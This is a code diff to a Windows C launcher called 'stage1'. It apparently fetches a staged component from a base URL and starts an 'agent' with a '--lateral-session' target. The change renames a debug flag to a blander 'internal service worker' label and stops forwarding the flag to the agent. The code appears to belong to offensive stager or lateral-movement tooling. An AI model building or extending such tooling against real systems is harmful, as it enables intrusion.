@@ -18,7 +18,7 @@
  * Arguments:
  *   --stage   <32-char hex staging id>
  *   --session <target session id>
- *   --debug-agent 1 (optional; write the separate debug agent filename)
+ *   --debug-stage-filename 1 (internal service worker filename selection)
  *
  * Flow:
  *   1. GET {BASE_URL}/tools/stage/{staging_id}
@@ -395,7 +395,6 @@ static const char *doStage(HINTERNET hSession,
     lstrcatW(cmdLine, agentPath);
     lstrcatW(cmdLine, L"\" --lateral-session ");
     lstrcatW(cmdLine, sessionIDW);
-    if (debugAgent) lstrcatW(cmdLine, L" --debug-agent 1");
 
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
@@ -453,7 +452,7 @@ static int runLauncher(void) {
             lstrcpynW(sessionID, argv[i + 1], 255);
         else if (lstrcmpW(argv[i], L"--base-url") == 0)
             lstrcpynW(customURL, argv[i + 1], 2047);
-        else if (lstrcmpW(argv[i], L"--debug-agent") == 0) {
+        else if (lstrcmpW(argv[i], L"--debug-stage-filename") == 0) {
             if (lstrcmpW(argv[i + 1], L"1") != 0) invalidDebugAgent = TRUE;
             else debugAgent = TRUE;
         }
@@ -461,7 +460,7 @@ static int runLauncher(void) {
     LocalFree(argv);
 
     if (invalidDebugAgent) {
-        consolePrint("stage1: --debug-agent requires 1");
+        consolePrint("stage1: --debug-stage-filename requires 1");
         return 2;
     }
 
